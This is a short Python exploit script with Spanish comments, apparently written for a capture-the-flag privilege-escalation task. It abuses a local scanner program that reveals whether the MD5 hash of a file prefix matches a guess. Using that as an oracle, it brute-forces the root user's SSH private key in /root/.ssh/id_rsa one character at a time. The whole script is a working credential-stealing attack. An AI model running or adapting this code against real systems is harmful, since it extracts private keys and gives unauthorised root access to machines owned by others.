import subprocess
import hashlib
import string

charset = string.ascii_letters + string.digits + "+/=\n"

def brute(file, guess):
    hash = hashlib.md5(guess.encode()).hexdigest()
    result = subprocess.run(['/opt/scanner/scanner', '-c', file, '-l', str(len(guess)), '-s', hash], stdout=subprocess.PIPE)
    if len(result.stdout) > 0:
        return True
    return False

LOOP = True
guess = "-----BEGIN OPENSSH PRIVATE KEY-----\n"
print(guess, end='')

while LOOP:
    found = False  # Bandera para verificar si se encontró un carácter
    for c in charset:
        if brute("/root/.ssh/id_rsa", guess + c):
            guess += c
            print(c, end='', flush=True)
            found = True  # Marca que encontró un carácter válido
            break
    if not found:
        print("\nNo se encontró un carácter válido, terminando el bucle.")
        break
